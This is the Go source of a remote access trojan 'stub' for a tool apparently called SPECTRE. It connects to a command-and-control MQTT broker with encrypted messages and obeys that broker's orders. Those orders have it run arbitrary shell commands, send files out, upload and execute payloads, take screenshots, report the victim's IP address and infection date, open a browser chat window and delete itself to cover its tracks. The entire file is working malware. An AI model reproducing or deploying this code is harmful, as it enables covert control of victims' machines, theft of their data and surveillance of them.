package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand" // Alias crypto/rand to avoid conflict
	"encoding/base64"
	"encoding/json"
	"fmt"
	mqtt "github.com/eclipse/paho.mqtt.golang"
	"image/png"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/kbinani/screenshot"
)

var (
	brokerURL     = "{BROKER_URL}"
	brokerPort    = {BROKER_PORT}
	topic         = "{TOPIC}"
	botID         = "{BOT_ID}"
	apiToken      = "{API_TOKEN}"
	encryptionKey = "{ENCRYPTION_KEY}"

	client        mqtt.Client
	running       bool = true
	isConnected   bool
	isListed      bool
	currentDir    string
	infectedDate  string
	messageChan   chan string
	closeChan     chan bool
	replyChan     chan string
	httpServer    *http.Server
	chatActive    bool
	chatPort      int
	chatMessages  []string
	chatMutex     sync.Mutex
	// control stub verbosity; default is quiet. Set STUB_VERBOSE=1 to enable console logs.
	stubVerbose   bool
	// throttle for publishing logs back to SPECTRE to avoid spam
	lastLogTime   time.Time
	logMutex      sync.Mutex
)

func encryptMessage(message string) string {
	key := []byte(encryptionKey)
	if len(key) < 16 {
		key = append(key, make([]byte, 16-len(key))...)
	} else if len(key) > 16 && len(key) < 24 {
		key = append(key, make([]byte, 24-len(key))...)
	} else if len(key) > 24 && len(key) < 32 {
		key = append(key, make([]byte, 32-len(key))...)
	} else if len(key) > 32 {
		key = key[:32]
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		sendLog("error", fmt.Sprintf("encryption error: %v", err))
		return message
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		sendLog("error", fmt.Sprintf("encryption error: %v", err))
		return message
	}

	nonce := make([]byte, aesgcm.NonceSize())
	if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
		sendLog("error", fmt.Sprintf("encryption error: %v", err))
		return message
	}

	ciphertext := aesgcm.Seal(nil, nonce, []byte(message), nil)
	tag := ciphertext[len(ciphertext)-16:]
	pureCiphertext := ciphertext[:len(ciphertext)-16]
	encrypted := append(nonce, pureCiphertext...)
	encrypted = append(encrypted, tag...)
	return base64.StdEncoding.EncodeToString(encrypted)
}

// sendLog publishes selective log messages back to the SPECTRE topic. By default
// only errors/warnings are sent to avoid noise. Set STUB_VERBOSE=1 to enable
// console prints and more log publishing.
func sendLog(level string, msg string) {
	// Only publish logs rarely (rate limit to 1s)
	logMutex.Lock()
	now := time.Now()
	if now.Sub(lastLogTime) < time.Second && level != "error" {
		logMutex.Unlock()
		if stubVerbose {
			// console-only when verbose
			fmt.Printf("[%s] %s\n", level, msg)
		}
		return
	}
	lastLogTime = now
	logMutex.Unlock()

	// Build a lightweight log envelope
	logObj := map[string]string{
		"type":  "log",
		"id":    botID,
		"level": level,
		"msg":   msg,
	}
	jb, _ := json.Marshal(logObj)
	// Only publish warnings/errors to avoid noise at scale. Info/debug
	// remain console-only when `STUB_VERBOSE=1`.
	if level == "warning" || level == "error" {
		if client != nil {
			encrypted := encryptMessage(string(jb))
			client.Publish(topic, 1, false, encrypted)
		}
	} else {
		if stubVerbose {
			fmt.Printf("[%s] %s\n", level, msg)
		}
	}
}

// matchesTarget performs robust target matching for commands. Accepts:
// - "all"
// - explicit botID
// - any target that ends with ":<botID>"
// - host:botID where host may be IPv4, IPv6 (with []), or hostname
func matchesTarget(target string) bool {
	target = strings.TrimSpace(target)
	if target == "all" || target == "*" || target == "" {
		return true
	}
	if target == botID {
		return true
	}
	// If the target contains a ':' and ends with :<botID>, match
	if strings.HasSuffix(target, ":"+botID) {
		return true
	}
	// If the target contains botID anywhere (fallback), match
	if strings.Contains(target, botID) {
		return true
	}
	// Compare against local IPs/hostnames
	ip, err := getLocalIP()
	if err == nil {
		if target == ip || strings.HasSuffix(target, ":"+ip) {
			return true
		}
	}
	hostname, _ := os.Hostname()
	if hostname != "" && (target == hostname || strings.HasSuffix(target, ":"+hostname)) {
		return true
	}
	return false
}

func decryptMessage(encryptedMessage string) string {
	encryptedData, err := base64.StdEncoding.DecodeString(encryptedMessage)
	if err != nil {
		sendLog("error", fmt.Sprintf("decryption error (base64): %v", err))
		return encryptedMessage
	}

	key := []byte(encryptionKey)
	if len(key) < 16 {
		key = append(key, make([]byte, 16-len(key))...)
	} else if len(key) > 16 && len(key) < 24 {
		key = append(key, make([]byte, 24-len(key))...)
	} else if len(key) > 24 && len(key) < 32 {
		key = append(key, make([]byte, 32-len(key))...)
	} else if len(key) > 32 {
		key = key[:32]
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		sendLog("error", fmt.Sprintf("decryption error: %v", err))
		return encryptedMessage
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		sendLog("error", fmt.Sprintf("decryption error: %v", err))
		return encryptedMessage
	}

	nonceSize := aesgcm.NonceSize()
	if len(encryptedData) < nonceSize+16 {
		fmt.Printf("Bot %s decryption error: invalid encrypted data\n", botID)
		return encryptedMessage
	}

	nonce := encryptedData[:nonceSize]
	tag := encryptedData[len(encryptedData)-16:]
	ciphertext := encryptedData[nonceSize : len(encryptedData)-16]
	combinedCiphertext := append(ciphertext, tag...)
	plaintext, err := aesgcm.Open(nil, nonce, combinedCiphertext, nil)
	if err != nil {
		fmt.Printf("Bot %s decryption error: %v\n", botID, err)
		return encryptedMessage
	}

	return string(plaintext)
}

const chatHTML = `
<!DOCTYPE html>
<html>
<head>
    <title>SPECTRE Chat</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            margin: 20px;
        }
        #chatArea {
            width: 100%;
            height: 300px;
            background-color: #2a2a2a;
            border: 2px solid #00ff00;
            padding: 10px;
            margin-bottom: 10px;
            overflow-y: scroll;
            white-space: pre-wrap;
        }
        #messageInput {
            width: 80%;
            background-color: #2a2a2a;
            color: #00ff00;
            border: 2px solid #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            padding: 5px;
        }
        button {
            background-color: #333333;
            color: #00ff00;
            border: 2px solid #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            padding: 5px 10px;
            cursor: pointer;
        }
        button:hover {
            background-color: #444444;
        }
    </style>
</head>
<body>
    <div id="chatArea"></div>
    <input type="text" id="messageInput" placeholder="Enter your reply (or press Enter to skip)">
    <button onclick="sendReply()">Send</button>
    <script>
        const chatArea = document.getElementById('chatArea');
        const messageInput = document.getElementById('messageInput');
        let lastMessageCount = 0;
        fetchMessages();
        setInterval(fetchMessages, 1000);
        function fetchMessages() {
            fetch('/messages')
                .then(response => response.json())
                .then(data => {
                    if (data.messages.length > lastMessageCount) {
                        chatArea.textContent = data.messages.join('\n');
                        lastMessageCount = data.messages.length;
                        chatArea.scrollTop = chatArea.scrollHeight;
                    }
                })
                .catch(err => console.error('Error fetching messages:', err));
        }
        messageInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendReply();
            }
        });
        function sendReply() {
            const reply = messageInput.value.trim();
            if (reply !== "") {
                fetch('/reply', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ reply: reply })
                }).then(response => response.json())
                  .then(data => {
                      if (data.status === 'success') {
                          messageInput.value = "";
                      }
                  }).catch(err => {
                      console.error('Error sending reply:', err);
                  });
            }
        }
    </script>
</body>
</html>
`

func init() {
	home, err := os.UserHomeDir()
	if err != nil {
		fmt.Printf("Error getting home directory: %v\n", err)
		currentDir = "."
	} else {
		currentDir = home
	}
	infectedDate = time.Now().Format(time.RFC3339)
}

type ConnectMessage struct {
	Type     string `json:"type"`
	ID       string `json:"id"`
	IP       string `json:"ip"`
	OS       string `json:"os"`
	Hostname string `json:"hostname"`
}

type CommandMessage struct {
	Type    string `json:"type"`
	Target  string `json:"target"`
	Action  string `json:"action"`
	Command string `json:"command,omitempty"`
	Message string `json:"message,omitempty"`
	File    string `json:"file,omitempty"`
	Data    string `json:"data,omitempty"`
}

type ResponseMessage struct {
	Type       string `json:"type"`
	ID         string `json:"id"`
	IP         string `json:"ip"`
	Message    string `json:"message,omitempty"`
	Result     string `json:"result,omitempty"`
	CurrentDir string `json:"current_dir,omitempty"`
	ZipData    string `json:"zip_data,omitempty"`
	FileData   string `json:"file_data,omitempty"`
}

func sendPresence(client mqtt.Client) {
	hostname, herr := os.Hostname()
	if hostname == "" || herr != nil {
		hostname = "unknown"
	}
	ip, err := getLocalIP()
	if err != nil || ip == "" {
		// do not abort presence send; use 'unknown' so GUI can choose to keep previous values
		ip = "unknown"
	}
	osInfo := runtime.GOOS
	connectMsg := ConnectMessage{
		Type:     "connect",
		ID:       botID,
		IP:       ip,
		OS:       osInfo,
		Hostname: hostname,
	}
	msgBytes, _ := json.Marshal(connectMsg)
	encryptedMsg := encryptMessage(string(msgBytes))
	if client != nil {
		client.Publish(topic, 1, false, encryptedMsg)
	}
	// Rare console logging only when verbose enabled
	if stubVerbose {
		fmt.Printf("Bot %s sent presence: %s\n", botID, string(msgBytes))
	}
}

func sendPresencePeriodically() {
	// Send a heartbeat every 24h by default (matching previous stub). Set
	// STUB_PRESENCE_INTERVAL (seconds) to override for testing.
	intervalSec := 24 * 60 * 60
	if v := os.Getenv("STUB_PRESENCE_INTERVAL"); v != "" {
		if iv, err := strconv.Atoi(v); err == nil && iv > 0 {
			intervalSec = iv
		}
	}
	ticker := time.NewTicker(time.Duration(intervalSec) * time.Second)
	defer ticker.Stop()
	for running {
		<-ticker.C
		if isConnected {
			sendPresence(client)
			isListed = true
		}
	}
}

func onConnect(client mqtt.Client) {
	// Clear retained control messages if any (best-effort)
	client.Publish(topic, 1, true, nil)
	sendLog("info", fmt.Sprintf("cleared retained messages on topic %s", topic))
	// Ensure subscription exists on connect
	if token := client.Subscribe(topic, 1, onMessage); token.Wait() && token.Error() != nil {
		sendLog("warning", fmt.Sprintf("subscribe failed: %v", token.Error()))
	} else {
		sendLog("info", fmt.Sprintf("subscribed to topic %s", topic))
	}
	isConnected = true
	sendPresence(client)
	isListed = true
}

func onDisconnect(client mqtt.Client, err error) {
	sendLog("warning", fmt.Sprintf("disconnected from MQTT broker: %v", err))
	isConnected = false
	isListed = false
}

func getLocalIP() (string, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "", err
	}
	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			default:
				continue
			}
			if ip.To4() != nil && !ip.IsLoopback() && !ip.IsLinkLocalUnicast() {
				return ip.String(), nil
			}
		}
	}
	hostname, err := os.Hostname()
	if err != nil {
		return "", err
	}
	addrs, err := net.LookupHost(hostname)
	if err != nil || len(addrs) == 0 {
		return "", err
	}
	for _, addr := range addrs {
		ip := net.ParseIP(addr)
		if ip == nil {
			continue
		}
		if ip.To4() != nil && !ip.IsLoopback() && !ip.IsLinkLocalUnicast() {
			return ip.String(), nil
		}
	}
	return "127.0.0.1", nil
}

func executeShellCommand(command string) string {
	command = strings.TrimSpace(command)
	if strings.ToLower(command) == "dir" || strings.ToLower(command) == "ls" {
		dirEntries, err := os.ReadDir(currentDir)
		if err != nil {
			return fmt.Sprintf("Error listing directory: %v", err)
		}
		var entries []string
		for _, entry := range dirEntries {
			entries = append(entries, entry.Name())
		}
		return strings.Join(entries, "\n")
	} else if len(command) >= 3 && strings.ToLower(command[:3]) == "cd " {
		newDir := strings.TrimSpace(command[3:])
		if newDir == "" {
			return "No directory specified"
		}
		var newPath string
		if filepath.IsAbs(newDir) {
			newPath = newDir
		} else {
			newPath = filepath.Join(currentDir, newDir)
		}
		if _, err := os.Stat(newPath); os.IsNotExist(err) {
			return fmt.Sprintf("Directory not found: %s", newPath)
		}
		currentDirnew, err := filepath.Abs(newPath)
		if err != nil {
			return fmt.Sprintf("Error resolving path: %v", err)
		}
		currentDir = currentDirnew
		return ""
	} else {
		// Use a context with timeout to avoid long-running blocking shell
		timeoutSec := 120
		if v := os.Getenv("STUB_SHELL_TIMEOUT"); v != "" {
			if iv, err := strconv.Atoi(v); err == nil && iv > 0 {
				timeoutSec = iv
			}
		}
		ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeoutSec)*time.Second)
		defer cancel()

		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.CommandContext(ctx, "cmd", "/C", command)
		} else if runtime.GOOS == "darwin" {
			cmd = exec.CommandContext(ctx, "sh", "-c", command)
		} else {
			cmd = exec.CommandContext(ctx, "bash", "-c", command)
		}
		cmd.Dir = currentDir
		output, err := cmd.CombinedOutput()
		if ctx.Err() == context.DeadlineExceeded {
			return fmt.Sprintf("Command timed out after %d seconds. Partial output:\n%s", timeoutSec, string(output))
		}
		if err != nil {
			return fmt.Sprintf("Error executing command: %v\nOutput: %s", err, output)
		}
		return string(output)
	}
}

func createDoxZip() string {
	ip, err := getLocalIP()
	if err != nil {
		fmt.Printf("Error getting local IP: %v\n", err)
		ip = "unknown"
	}
	data := map[string]string{
		"ip":           ip,
		"id":           botID,
		"infected_date": infectedDate,
	}
	dataBytes, _ := json.Marshal(data)
	return base64.StdEncoding.EncodeToString(dataBytes)
}

func takeScreenshot() (string, error) {
	n := screenshot.NumActiveDisplays()
	if n < 1 {
		return "", fmt.Errorf("no active displays found")
	}
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return "", fmt.Errorf("error capturing screenshot: %v", err)
	}

	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return "", fmt.Errorf("error encoding screenshot to PNG: %v", err)
	}

	encodedData := base64.StdEncoding.EncodeToString(buf.Bytes())
	return encodedData, nil
}

func handleMessageInteraction(message string) {
	chatMutex.Lock()
	if chatActive {
		chatMessages = append(chatMessages, fmt.Sprintf("Received: %s", message))
		chatMutex.Unlock()
		fmt.Printf("Appended message to existing chat session\n")
		return
	}

	chatMessages = []string{fmt.Sprintf("Received: %s", message)}
	chatActive = true
	chatPort = rand.Intn(65535-49152) + 49152
	addr := fmt.Sprintf("localhost:%d", chatPort)
	chatMutex.Unlock()

	tempFile := filepath.Join(os.TempDir(), fmt.Sprintf("spectre_chat_%s.html", botID))
	err := ioutil.WriteFile(tempFile, []byte(chatHTML), 0644)
	if err != nil {
		fmt.Printf("Error writing chat HTML to temp file: %v\n", err)
		chatActive = false
		return
	}
	defer os.Remove(tempFile)

	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, tempFile)
	})
	mux.HandleFunc("/messages", func(w http.ResponseWriter, r *http.Request) {
		chatMutex.Lock()
		defer chatMutex.Unlock()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string][]string{"messages": chatMessages})
	})
	mux.HandleFunc("/reply", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}
		var replyData struct {
			Reply string `json:"reply"`
		}
		if err := json.NewDecoder(r.Body).Decode(&replyData); err != nil {
			http.Error(w, "Invalid request", http.StatusBadRequest)
			return
		}
		chatMutex.Lock()
		chatMessages = append(chatMessages, fmt.Sprintf("Sent: %s", replyData.Reply))
		chatMutex.Unlock()
		replyChan <- replyData.Reply
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"status": "success"})
	})

	httpServer = &http.Server{
		Addr:    addr,
		Handler: mux,
	}

	go func() {
		if err := httpServer.ListenAndServe(); err != http.ErrServerClosed {
			fmt.Printf("HTTP server error: %v\n", err)
		}
	}()

	url := fmt.Sprintf("http://%s", addr)
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "start", url)
	} else if runtime.GOOS == "darwin" {
		cmd = exec.Command("open", url)
	} else {
		cmd = exec.Command("xdg-open", url)
	}
	if err := cmd.Start(); err != nil {
		fmt.Printf("Error opening browser: %v\n", err)
		chatActive = false
		return
	}
	fmt.Printf("Opened browser for chat at %s\n", url)

	<-closeChan
	fmt.Printf("Chat session closed due to close_message command\n")

	if err := httpServer.Close(); err != nil {
		fmt.Printf("Error closing HTTP server: %v\n", err)
	}
	chatMutex.Lock()
	chatActive = false
	chatMessages = nil
	chatPort = 0
	httpServer = nil
	chatMutex.Unlock()
}

func onMessage(client mqtt.Client, msg mqtt.Message) {
	var data CommandMessage
	encryptedMessage := string(msg.Payload())
	if encryptedMessage == "" {
		sendLog("debug", "received empty message, ignoring")
		return
	}

	message := decryptMessage(encryptedMessage)
	if err := json.Unmarshal([]byte(message), &data); err != nil {
		sendLog("error", fmt.Sprintf("error decoding message: %v", err))
		return
	}
	sendLog("debug", fmt.Sprintf("received message: %s", message))

	if data.Type == "command" {
		target := data.Target
		if matchesTarget(target) {
			sendLog("info", fmt.Sprintf("target matched: %s", target))
			processAction(data.Action, data)
		} else {
			sendLog("debug", fmt.Sprintf("target did not match: %s", target))
		}
	}
}

// startAdminServer starts a localhost-only admin HTTP server if port > 0.
// Endpoints:
//  - GET /status -> JSON {id, ip, connected}
//  - POST /shutdown -> triggers graceful shutdown
func startAdminServer(port int) {
	if port <= 0 {
		return
	}
	mux := http.NewServeMux()
	mux.HandleFunc("/status", func(w http.ResponseWriter, r *http.Request) {
		ip, _ := getLocalIP()
		status := map[string]interface{}{
			"id":        botID,
			"ip":        ip,
			"connected": isConnected,
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(status)
	})
	mux.HandleFunc("/shutdown", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		go func() {
			sendLog("info", "admin requested shutdown")
			if client != nil {
				client.Disconnect(250)
			}
			running = false
			time.Sleep(100 * time.Millisecond)
			os.Exit(0)
		}()
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]string{"status": "shutting down"})
	})

	addr := fmt.Sprintf("127.0.0.1:%d", port)
	server := &http.Server{Addr: addr, Handler: mux}
	go func() {
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			sendLog("warning", fmt.Sprintf("admin server error: %v", err))
		}
	}()
	sendLog("info", fmt.Sprintf("admin server listening on %s", addr))
}

func processAction(action string, data CommandMessage) {
	ip, err := getLocalIP()
	if err != nil {
		sendLog("error", fmt.Sprintf("error getting local IP: %v", err))
		return
	}
	switch action {
	case "ping":
		sendLog("debug", "processing ping command")
		if isListed {
			sendPresence(client)
		}
	case "shell":
		command := data.Command
		result := executeShellCommand(command)
		response := ResponseMessage{
			Type:       "shell_response",
			ID:         botID,
			IP:         ip,
			Result:     result,
			CurrentDir: currentDir,
		}
		msgBytes, _ := json.Marshal(response)
		encryptedMsg := encryptMessage(string(msgBytes))
		if client != nil {
			client.Publish(topic, 1, false, encryptedMsg)
		}
		sendLog("info", "sent shell response")
	case "download":
		fileName := data.File
		filePath := filepath.Join(currentDir, fileName)
		fileInfo, err := os.Stat(filePath)
		if err != nil {
			sendLog("error", fmt.Sprintf("error accessing file %s: %v", filePath, err))
			return
		}
		if fileInfo.IsDir() {
            sendLog("error", fmt.Sprintf("cannot download directory %s", filePath))
			return
		}
		fileData, err := ioutil.ReadFile(filePath)
		if err != nil {
			sendLog("error", fmt.Sprintf("error reading file %s: %v", filePath, err))
			return
		}
		encodedData := base64.StdEncoding.EncodeToString(fileData)
		response := ResponseMessage{
			Type:     "download_response",
			ID:       botID,
			IP:       ip,
			FileData: encodedData,
			Message:  fileName,
		}
		msgBytes, _ := json.Marshal(response)
		encryptedMsg := encryptMessage(string(msgBytes))
		if client != nil {
			client.Publish(topic, 1, false, encryptedMsg)
		}
		sendLog("info", fmt.Sprintf("sent download response for file %s", fileName))
	case "upload":
		fileName := data.File
		filePath := filepath.Join(currentDir, fileName)
		fileData, err := base64.StdEncoding.DecodeString(data.Data)
		if err != nil {
			sendLog("error", fmt.Sprintf("error decoding file data for %s: %v", fileName, err))
			return
		}
		err = ioutil.WriteFile(filePath, fileData, 0644)
		if err != nil {
			sendLog("error", fmt.Sprintf("error writing file %s: %v", filePath, err))
			return
		}
		response := ResponseMessage{
			Type:    "upload_response",
			ID:      botID,
			IP:      ip,
			Message: fmt.Sprintf("File %s uploaded successfully", fileName),
		}
		msgBytes, _ := json.Marshal(response)
		encryptedMsg := encryptMessage(string(msgBytes))
		if client != nil {
			client.Publish(topic, 1, false, encryptedMsg)
		}
		sendLog("info", fmt.Sprintf("sent upload response for file %s", fileName))
	case "execute":
		fileName := data.File
		filePath := filepath.Join(currentDir, fileName)
		fileInfo, err := os.Stat(filePath)
		if err != nil {
			sendLog("error", fmt.Sprintf("error accessing file %s: %v", filePath, err))
			return
		}
		if fileInfo.IsDir() {
            sendLog("error", fmt.Sprintf("cannot execute directory %s", filePath))
			return
		}
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/C", filePath)
		} else {
			cmd = exec.Command("sh", "-c", filePath)
		}
		cmd.Dir = currentDir
		err = cmd.Start()
		if err != nil {
			sendLog("error", fmt.Sprintf("error executing file %s: %v", filePath, err))
			return
		}
		response := ResponseMessage{
			Type:    "execute_response",
			ID:      botID,
			IP:      ip,
			Message: fmt.Sprintf("File %s executed", fileName),
		}
		msgBytes, _ := json.Marshal(response)
		encryptedMsg := encryptMessage(string(msgBytes))
		if client != nil {
			client.Publish(topic, 1, false, encryptedMsg)
		}
		sendLog("info", fmt.Sprintf("sent execute response for file %s", fileName))
	case "screenshot":
		encodedData, err := takeScreenshot()
		if err != nil {
			sendLog("error", fmt.Sprintf("error taking screenshot: %v", err))
			return
		}
		response := ResponseMessage{
			Type:     "screenshot_response",
			ID:       botID,
			IP:       ip,
			FileData: encodedData,
			Message:  fmt.Sprintf("screenshot_%s.png", time.Now().Format("20060102_150405")),
		}
		msgBytes, _ := json.Marshal(response)
		encryptedMsg := encryptMessage(string(msgBytes))
		if client != nil {
			client.Publish(topic, 1, false, encryptedMsg)
		}
		sendLog("info", "sent screenshot response")
	case "dox":
		sendLog("debug", "processing dox command")
		zipData := createDoxZip()
		response := ResponseMessage{
			Type:    "dox_response",
			ID:      botID,
			IP:      ip,
			ZipData: zipData,
		}
		msgBytes, _ := json.Marshal(response)
		encryptedMsg := encryptMessage(string(msgBytes))
		client.Publish(topic, 1, false, encryptedMsg)
		sendLog("info", "sent dox response")
	case "message":
		message := data.Message
		go handleMessageInteraction(message)
	case "close_message":
		sendLog("info", "received close_message command")
		closeChan <- true
	case "delete":
		// Schedule a reliable self-delete then exit
		exePath, err := os.Executable()
		if err != nil {
			sendLog("error", fmt.Sprintf("delete: unable to resolve executable path: %v", err))
			return
		}
		if err := scheduleSelfDelete(exePath); err != nil {
			sendLog("error", fmt.Sprintf("delete: failed to schedule self-delete: %v", err))
			return
		}
		sendLog("info", "delete: scheduled self-delete, exiting")
		if client != nil {
			client.Disconnect(250)
		}
		running = false
		time.Sleep(200 * time.Millisecond)
		os.Exit(0)
	case "disconnect":
		sendLog("info", "received disconnect command; shutting down")
		if client != nil {
			client.Disconnect(250)
		}
		running = false
		// give some time for final publishes
		time.Sleep(200 * time.Millisecond)
		os.Exit(0)
	}
}

// scheduleSelfDelete creates and launches a small helper script that will
// delete the running executable after this process exits. Works on Windows
// and POSIX systems. Returns an error if scheduling fails.
func scheduleSelfDelete(exePath string) error {
    exePathAbs, err := filepath.Abs(exePath)
    if err == nil {
        exePath = exePathAbs
    }
    tmpDir := os.TempDir()
    if runtime.GOOS == "windows" {
        scriptPath := filepath.Join(tmpDir, fmt.Sprintf("delete_%d.cmd", time.Now().UnixNano()))
        content := fmt.Sprintf("@echo off\r\nping -n 3 127.0.0.1 >nul\r\n:loop\r\ndel /F /Q \"%s\" >nul 2>&1\r\nif exist \"%s\" goto loop\r\ndel /F /Q \"%%~f0\" >nul 2>&1\r\n", exePath, exePath)
        if err := ioutil.WriteFile(scriptPath, []byte(content), 0644); err != nil {
            return err
        }
        cmd := exec.Command("cmd", "/C", "start", "", scriptPath)
        return cmd.Start()
    } else {
        scriptPath := filepath.Join(tmpDir, fmt.Sprintf("delete_%d.sh", time.Now().UnixNano()))
        content := fmt.Sprintf("#!/bin/sh\nsleep 2\nwhile [ -e \"%s\" ]; do\n  rm -f \"%s\" || sleep 1\ndone\nrm -f \"$0\"\n", exePath, exePath)
        if err := ioutil.WriteFile(scriptPath, []byte(content), 0755); err != nil {
            return err
        }
        cmd := exec.Command("sh", "-c", fmt.Sprintf("nohup %s >/dev/null 2>&1 &", scriptPath))
        return cmd.Start()
    }
}

func connectWithBackoff() {
	// Basic exponential backoff loop until connected. If AutoReconnect is enabled
	// the client will manage reconnections as well; this loop handles initial
	// connect attempts with increasing delays.
	backoffDurations := []time.Duration{1 * time.Second, 5 * time.Second, 15 * time.Second, 60 * time.Second}
	attempt := 0
	for running && !isConnected {
		if attempt >= len(backoffDurations) {
			attempt = len(backoffDurations) - 1
		}
		wait := backoffDurations[attempt]
		sendLog("info", fmt.Sprintf("attempting to connect to MQTT broker (attempt %d), waiting %v before retry", attempt+1, wait))
		if token := client.Connect(); token.Wait() && token.Error() != nil {
			sendLog("warning", fmt.Sprintf("failed to connect to MQTT broker: %v", token.Error()))
			time.Sleep(wait)
			attempt++
			continue
		}
		// onConnect will handle subscription and presence
		sendLog("info", "successfully connected to MQTT broker")
		attempt = 0
		// give a short pause for connection to stabilize
		time.Sleep(200 * time.Millisecond)
	}
}

func main() {
	// Minimal startup logging; can be enabled via STUB_VERBOSE=1
	if os.Getenv("STUB_VERBOSE") == "1" {
		stubVerbose = true
	}
	if stubVerbose {
		fmt.Printf("Bot %s starting up, waiting for messages...\n", botID)
	}

	rand.Seed(time.Now().UnixNano())

	messageChan = make(chan string)
	closeChan = make(chan bool)
	replyChan = make(chan string)

	// Values are injected by Spectre during generation; do not override

	opts := mqtt.NewClientOptions()
	opts.AddBroker(fmt.Sprintf("tcp://%s:%d", brokerURL, brokerPort))
	opts.SetClientID(fmt.Sprintf("rat_bot_%s", botID))
	opts.SetKeepAlive(60 * time.Second)
	opts.SetOnConnectHandler(onConnect)
	opts.SetConnectionLostHandler(onDisconnect)
	// Enable automatic reconnect support and set timeouts to reduce disconnect proneness
	opts.AutoReconnect = true
	opts.SetConnectTimeout(30 * time.Second)
	if apiToken != "" {
		opts.SetUsername(apiToken)
	}
	client = mqtt.NewClient(opts)

	// Start presence ticker
	go sendPresencePeriodically()

	// Optional admin server started by env var STUB_ADMIN_PORT
	if v := os.Getenv("STUB_ADMIN_PORT"); v != "" {
		if p, err := strconv.Atoi(v); err == nil && p > 0 {
			startAdminServer(p)
		}
	}

	for running {
		connectWithBackoff()
		for running && isConnected {
			select {
			case reply := <-replyChan:
				if reply != "" {
					ip, err := getLocalIP()
					if err != nil {
						sendLog("error", fmt.Sprintf("error getting local IP: %v", err))
						continue
					}
					response := ResponseMessage{
						Type:    "message_response",
						ID:      botID,
						IP:      ip,
						Message: reply,
					}
					msgBytes, _ := json.Marshal(response)
					encryptedMsg := encryptMessage(string(msgBytes))
					if client != nil {
						client.Publish(topic, 1, false, encryptedMsg)
					}
					sendLog("info", "sent message reply")
				}
			default:
				time.Sleep(100 * time.Millisecond)
			}
		}
		if !running {
			break
		}
	}

	if running && client != nil {
		client.Disconnect(250)
	}
}